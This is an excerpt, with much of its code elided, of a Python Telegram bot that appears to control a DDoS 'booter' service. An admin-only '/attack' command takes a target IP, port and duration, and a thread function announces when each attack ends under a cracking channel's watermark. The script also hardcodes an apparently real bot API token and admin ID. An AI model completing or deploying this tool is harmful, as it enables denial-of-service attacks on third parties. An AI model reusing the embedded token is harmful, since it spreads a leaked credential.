...
API_TOKEN = "7160038773:AAF1eyCrGmDk2JcM143zX-5QgORyDeIJNPc"
ADMIN_IDS = {7088155732}  # Example: set of admin IDs
...
def attack_thread(ip, port, attack_time, attack_id):
    try:
        ...
        message = (f'Attack ended\n'
                   ...
                   f'Watermark: @telegram channel @SOULCRACKS VIPMODSXADMIN Terms of service use and legal considerations.')
...
def attack(message):
    log_command(message.from_user.id, '/attack')
    if not is_admin(message.from_user.id):
        bot.reply_to(message, 'You are not authorized to use this command.')
        return
    ...
    args = message.text.split()
    if len(args) != 5:
        bot.reply_to(message, 'Usage: /attack <ip> <port> <time> <user_id>')
        return
